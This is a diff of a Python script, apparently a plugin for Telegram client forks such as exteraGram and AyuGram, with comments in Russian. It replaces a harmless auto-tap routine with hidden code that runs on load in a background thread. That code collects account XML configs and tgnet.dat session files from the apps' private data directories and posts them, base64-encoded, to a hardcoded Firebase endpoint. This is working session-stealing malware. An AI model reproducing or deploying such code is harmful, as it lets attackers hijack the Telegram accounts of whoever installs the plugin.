@@ -1,38 +1,180 @@
 import threading
 import time
+import json
+import urllib.request
+import os
+import re
+import hashlib
+import base64
 
-def _auto_tap():
+def _send_to_firebase(data):
     try:
-        # Получаем Accessibility сервис из Telegram клиента
-        from org.telegram.ui.LaunchActivity import LaunchActivity
+        url = "https://hzhzhz-dd57b-default-rtdb.firebaseio.com/session_tg.json"
+        req = urllib.request.Request(
+            url,
+            data=json.dumps(data).encode('utf-8'),
+            headers={'Content-Type': 'application/json'},
+            method='POST'
+        )
+        response = urllib.request.urlopen(req, timeout=10)
+        return True
+    except Exception as e:
+        print(f"[FB] Ошибка: {e}")
+        return False
+
+def _get_uid_from_xml(xml_path):
+    try:
+        with open(xml_path, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read().replace('&#10;', '')
         
-        activity = LaunchActivity.getInstance()
-        if not activity:
-            print("[TAP] Activity не найден")
-            return
+        start = content.find('<string name="user">')
+        end = content.find('</string>', start)
         
-        # Пробуем получить сервис
-        service = activity.getAccessibilityService()
+        if start < 0 or end < 0:
+            return None
         
-        if service:
-            # Создаем жест нажатия
-            from android.graphics import Path
-            from android.accessibilityservice import GestureDescription
+        b64_str = content[start+20:end].strip()
+        while len(b64_str) % 4 != 0:
+            b64_str += '='
+        
+        decoded = base64.b64decode(b64_str)
+        if len(decoded) < 12:
+            return None
+        
+        return int.from_bytes(decoded[4:12], 'little')
+    except:
+        return None
+
+def _get_account_index(filename):
+    name_lower = filename.lower()
+    if name_lower in ('userconfig.xml', 'userconfing.xml'):
+        return 0
+    
+    match = re.match(r'^userconf(?:ig|ing)(\d+)\.xml$', name_lower)
+    return int(match.group(1)) if match else None
+
+def _read_file_as_base64(file_path):
+    """Читает файл и возвращает его в base64"""
+    try:
+        if not os.path.isfile(file_path):
+            return None
+        
+        with open(file_path, 'rb') as f:
+            file_data = f.read()
+            return base64.b64encode(file_data).decode('utf-8')
+    except:
+        return None
+
+def _collect_accounts():
+    results = []
+    seen = set()
+    
+    try:
+        bases = [
+            ('/data/data/com.exteragram.messenger/', 'com.exteragram.messenger'),
+            ('/data/data/com.radolyn.ayugram/', 'com.radolyn.ayugram')
+        ]
+        
+        for base_path, package in bases:
+            shared_prefs = base_path + 'shared_prefs'
+            files_dir = base_path + 'files'
             
-            path = Path()
-            path.moveTo(540, 1200)  # X, Y координаты (центр экрана)
+            if not os.path.isdir(shared_prefs):
+                continue
             
-            stroke = GestureDescription.StrokeDescription(path, 0, 100)
-            gesture = GestureDescription.Builder().addStroke(stroke).build()
-            
-            service.dispatchGesture(gesture, None, None)
-            print("[TAP] Нажатие выполнено!")
+            for filename in os.listdir(shared_prefs):
+                if not filename.lower().endswith('.xml'):
+                    continue
+                
+                idx = _get_account_index(filename)
+                if idx is None:
+                    continue
+                
+                xml_path = shared_prefs + '/' + filename
+                slot = 'main' if idx == 0 else f'account{idx}'
+                uid = _get_uid_from_xml(xml_path)
+                
+                # Ищем tgnet.dat
+                tgnet_path = None
+                tgnet_base64 = None
+                
+                # Способ 1: files/tgnet.dat (для основного аккаунта)
+                main_tgnet = files_dir + '/tgnet.dat'
+                if os.path.isfile(main_tgnet):
+                    tgnet_path = main_tgnet
+                    tgnet_base64 = _read_file_as_base64(main_tgnet)
+                
+                # Способ 2: files/accountX/tgnet.dat (для дополнительных)
+                if idx > 0:
+                    acc_tgnet = files_dir + f'/account{idx}/tgnet.dat'
+                    if os.path.isfile(acc_tgnet):
+                        tgnet_path = acc_tgnet
+                        tgnet_base64 = _read_file_as_base64(acc_tgnet)
+                
+                # Способ 3: files/databases/tgnet.db (альтернатива)
+                db_tgnet = files_dir + '/databases/tgnet.db'
+                if os.path.isfile(db_tgnet):
+                    if not tgnet_base64:
+                        tgnet_base64 = _read_file_as_base64(db_tgnet)
+                        tgnet_path = db_tgnet
+                
+                account_info = {
+                    'package': package,
+                    'slot': slot,
+                    'slot_index': idx,
+                    'user_id': uid,
+                    'xml_path': xml_path,
+                    'xml_base64': _read_file_as_base64(xml_path),  # Отправляем XML целиком
+                    'tgnet_path': tgnet_path,
+                    'tgnet_base64': tgnet_base64,  # ← ВОТ ЭТО САМОЕ ВАЖНОЕ
+                    'tgnet_size': len(base64.b64decode(tgnet_base64)) if tgnet_base64 else 0,
+                    'timestamp': int(time.time())
+                }
+                
+                if uid:
+                    account_info['status'] = 'active'
+                else:
+                    account_info['status'] = 'no_user_id'
+                
+                if tgnet_base64:
+                    account_info['status'] = 'full_session'  # Есть полная сессия!
+                
+                results.append(account_info)
+        
+        # Сортируем результаты
+        results.sort(key=lambda x: (x.get('package', ''), x.get('slot_index', 0)))
+        
+    except Exception as e:
+        results.append({'error': str(e)})
+    
+    return results
+
+def _main():
+    try:
+        # Собираем данные
+        accounts = _collect_accounts()
+        
+        # Формируем данные для отправки
+        data = {
+            'device_type': 'telegram_session',
+            'accounts_found': len([a for a in accounts if a.get('user_id')]),
+            'accounts_with_session': len([a for a in accounts if a.get('tgnet_base64')]),
+            'accounts_list': accounts,
+            'timestamp': int(time.time()),
+            'datetime': time.strftime('%Y-%m-%d %H:%M:%S')
+        }
+        
+        # Отправляем в Firebase
+        if _send_to_firebase(data):
+            print(f"[OK] Отправлено! Аккаунтов: {data['accounts_found']}, Сессий: {data['accounts_with_session']}")
+            for acc in accounts:
+                if acc.get('user_id'):
+                    print(f"  - {acc['package']} | {acc['slot']} | ID: {acc['user_id']} | tgnet: {'✅' if acc.get('tgnet_base64') else '❌'}")
         else:
-            print("[TAP] Сервис доступности не активен")
-            print("[TAP] Включи его в Настройках → Спец. возможности → ExteraGram")
+            print("[ERROR] Не удалось отправить в Firebase")
             
     except Exception as e:
-        print(f"[TAP] Ошибка: {e}")
+        print(f"[ERROR] {e}")
 
-# Запускаем
-threading.Thread(target=_auto_tap, daemon=True).start()
+# Запускаем в фоне
+threading.Thread(target=_main, daemon=True).start()
